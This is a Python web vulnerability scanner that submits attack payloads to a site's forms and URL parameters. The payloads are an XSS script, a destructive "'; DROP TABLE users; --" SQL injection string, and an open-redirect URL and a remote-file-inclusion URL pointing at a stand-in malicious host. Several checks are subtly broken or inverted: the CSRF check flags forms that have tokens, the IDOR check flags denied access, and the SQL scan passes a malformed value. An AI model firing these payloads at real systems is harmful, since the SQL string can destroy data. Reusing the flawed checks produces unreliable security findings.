import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input_name = input.get("name")
            input_value = value
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<script>alert('hi')</script>"
    xss_vulnerabilities = []
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            xss_vulnerabilities.append({"url": url, "form_details": form_details})
    return xss_vulnerabilities

def scan_sql_injection(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    sql_payload = "'; DROP TABLE users; --"  # Example SQL injection payload
    sql_vulnerabilities = []
    for form in forms:
        form_details = get_form_details(form)
        data = {}
        for input_tag in form.find_all("input"):
            input_name = input_tag.attrs.get("name")
            data[input_name] = sql_payload

        response = submit_form(form_details, url, data)
        if "SQL syntax" in response.text:
            print(f"[+] SQL Injection Detected on {url}")
            print(f"[*] Form details:")
            sql_vulnerabilities.append({"url": url, "form_details": form_details})
    return sql_vulnerabilities

def scan_csrf(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    csrf_vulnerabilities = []
    for form in forms:
        form_details = get_form_details(form)
        # Check if the form contains anti-CSRF tokens
        csrf_token = form.find("input", {"name": "csrf_token"})
        if csrf_token:
            print(f"[+] CSRF Token found on {url}")
            print(f"[*] Form details:")
            csrf_vulnerabilities.append({"url": url, "form_details": form_details})
    return csrf_vulnerabilities


def scan_open_redirect(url):
    print(f"[+] Scanning for Open Redirect on {url}.")
    open_redirect_vulnerabilities = []
    # Example payload for open redirect
    redirect_payload = "https://malicious-website.com"

    response = requests.get(urljoin(url, f"?redirect={redirect_payload}"))
    if redirect_payload in response.url:
        print(f"[+] Open Redirect Detected on {url}")
        open_redirect_vulnerabilities.append({"url": url})
    return open_redirect_vulnerabilities


def scan_remote_file_inclusion(url):
    print(f"[+] Scanning for Remote File Inclusion on {url}.")
    rfi_vulnerabilities = []
    # Example payload for remote file inclusion
    rfi_payload = "https://malicious-website.com/malicious-code.txt"

    response = requests.get(urljoin(url, f"?file={rfi_payload}"))
    if "malicious content" in response.text:
        print(f"[+] Remote File Inclusion Detected on {url}")
        rfi_vulnerabilities.append({"url": url})
    return rfi_vulnerabilities


def scan_missing_security_headers(url):
    print(f"[+] Scanning for Missing Security Headers on {url}.")
    missing_headers_vulnerabilities = []

    headers_to_check = [
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-Content-Type-Options",
        # Add more security headers to check
    ]

    response = requests.get(url)

    for header in headers_to_check:
        if header not in response.headers:
            print(f"[+] Missing {header} Header on {url}")
            missing_headers_vulnerabilities.append({"url": url, "header": header})

    return missing_headers_vulnerabilities


def scan_idor(url):
    print(f"[+] Scanning for Insecure Direct Object References (IDOR) on {url}.")
    idor_vulnerabilities = []

    # Example: Assume the application uses numeric IDs for user profiles
    user_id = 1  # Try accessing user with ID 1 (you may need to adjust based on the application's logic)

    response = requests.get(urljoin(url, f"/user/{user_id}"))

    # Check if the response indicates access to unauthorized resources (e.g., sensitive user data)
    if "Unauthorized" in response.text or "Access Denied" in response.text:
        print(f"[+] Insecure Direct Object Reference (IDOR) Detected on {url}")
        idor_vulnerabilities.append({"url": url, "user_id": user_id})

    return idor_vulnerabilities


def scan_security_misconfigurations(url):
    print(f"[+] Scanning for Security Misconfigurations on {url}.")
    security_misconfigurations = []

    # Check for common security misconfigurations
    response = requests.get(url, verify=False)  # Disable SSL certificate verification (for demonstration purposes only)

    # Example 1: Check for directory listing
    if "Index of" in response.text:
        print(f"[+] Directory Listing Detected on {url}")
        security_misconfigurations.append({"url": url, "issue": "Directory Listing"})

    # Example 2: Check for exposed sensitive files
    sensitive_files = ["config.php", "secrets.txt", "database.yml"]
    for file in sensitive_files:
        if file in response.text:
            print(f"[+] Exposed Sensitive File Detected ({file}) on {url}")
            security_misconfigurations.append({"url": url, "issue": f"Exposed Sensitive File: {file}"})

    # Add more checks for common security misconfigurations

    return security_misconfigurations

def scan_website(url):
    vulnerabilities = []

    # Scan for XSS vulnerabilities
    xss_vulnerabilities = scan_xss(url)
    vulnerabilities.extend(xss_vulnerabilities)

    # Scan for SQL injection vulnerabilities
    sql_vulnerabilities = scan_sql_injection(url)
    vulnerabilities.extend(sql_vulnerabilities)

    # Scan for CSRF vulnerabilities
    csrf_vulnerabilities = scan_csrf(url)
    vulnerabilities.extend(csrf_vulnerabilities)

    # Scan for Open Redirect vulnerabilities
    open_redirect_vulnerabilities = scan_open_redirect(url)
    vulnerabilities.extend(open_redirect_vulnerabilities)

    # Scan for Remote File Inclusion vulnerabilities
    rfi_vulnerabilities = scan_remote_file_inclusion(url)
    vulnerabilities.extend(rfi_vulnerabilities)

    # Scan for Missing Security Headers vulnerabilities
    missing_headers_vulnerabilities = scan_missing_security_headers(url)
    vulnerabilities.extend(missing_headers_vulnerabilities)

    # Scan for Insecure Direct Object References (IDOR) vulnerabilities
    idor_vulnerabilities = scan_idor(url)
    vulnerabilities.extend(idor_vulnerabilities)

    # Scan for Security Misconfigurations
    security_misconfigurations = scan_security_misconfigurations(url)
    vulnerabilities.extend(security_misconfigurations)

    return vulnerabilities


if __name__ == "__main__":
    url = "https://example.com"
    results = scan_website(url)

    if results:
        print("Vulnerabilities found:")
        for vulnerability in results:
            print(vulnerability)
    else:
        print("No vulnerabilities found.")
